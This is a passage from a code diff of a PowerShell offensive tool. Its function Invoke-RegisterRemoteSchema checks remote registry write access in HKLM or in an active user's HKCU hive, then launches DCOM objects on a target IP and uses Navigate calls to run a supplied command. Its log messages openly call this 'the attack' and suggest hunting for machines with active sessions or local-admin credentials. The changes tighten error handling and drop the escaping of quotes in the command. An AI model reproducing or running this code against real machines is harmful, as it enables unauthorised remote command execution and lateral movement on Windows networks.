+                    $isHKLM = $true
+                    $isHKLMWritable = Check-RegistryPermission -RemoteIP $RemoteIP -Key "Software\Classes\AppID" -CheckWritePermissions
 
                 }
 
-                
-                
-                # if HKLM is not writable, Check if the user is an active user using browsing the available SIDs inside the HKU hive
-                # if it is available, change the hive to the current user, otherwise, return
-                $isHKLM = $true
                 if(!$isHKLMWritable) {
-                    Test-RegistryConnection -RemoteIP $RemoteIP -Hive HKU|Out-Null
+                    Write-Log -Level ERROR -Message "HKLM is not writable!" -forceVerbose
+                    # if HKLM is not writable, Check if the user is an active user using browsing the available SIDs inside the HKU hive
+                    # if it is available, change the hive to the current user, otherwise, return
+                    if(!(Test-RegistryConnection -RemoteIP $RemoteIP -Hive HKU)) {
+                        Write-Log -Level ERROR -Message "Can't access HKU Hive!" -forceVerbose
+                        continue
+                    }
                     $SID = (Get-userSID -RemoteIP $RemoteIP -Username $Username.Split("\")[-1]).Trim()
                     if($SID -and (Find-InArray -Content $SID -Array (Get-RegKeyName -Key "")) -and (Find-InArray -Content "Software" -Array (Get-RegKeyName -Key $SID))) {
                         Write-Log -Level VERBOSE -Message "$($Username) is on an active session!"
                         $isHKLM = $false
-                        Test-RegistryConnection -RemoteIP $RemoteIP -CheckWritePermissions -Hive HKCU|Out-Null
+                        if(!(Test-RegistryConnection -RemoteIP $RemoteIP -CheckWritePermissions -Hive HKCU)) {
+                            Write-Log -Level ERROR -Message "Can't access HKCU Hive!" -forceVerbose
+                            continue
+                        }
                     } else {
                         Write-Log -Level ERROR -Message "Can't perform the attack! try to find another machine that currently has an active session of the provided credentials/current logged-on user, or try to use with credentials that have local-admin rights"
-                        return
+                        continue
                     }
                 }
+
+                
+                
+                
 
                 $ExploitationSequences = New-Object System.Collections.ArrayList
                 
@@ -4141,7 +4188,6 @@ function Invoke-RegisterRemoteSchema {
                 
 
                 $isCommandExecuted = $false
-                $Command = $Command.Replace('"', "%2522").Replace("'", "%2527")
                 foreach($dcom in $DCOMList) {
                     if(Start-COMObjectInstance -ObjectName $dcom -RemoteIP $RemoteIP) {
                         foreach($NavigationCommand in @("Navigate", "Navigate2")) {
@@ -4179,7 +4225,7 @@ function Invoke-RegisterRemoteSchema {
             } finally {
                 if($AutoGrant) {
                     if(!$isHKLM) {
-                        Test-RegistryConnection -RemoteIP $RemoteIP -CheckWritePermissions -Hive HKlm|Out-Null
+                        Test-RegistryConnection -RemoteIP $RemoteIP -CheckWritePermissions -Hive HKLM|Out-Null
                     }
                     Rev2Self
                 }
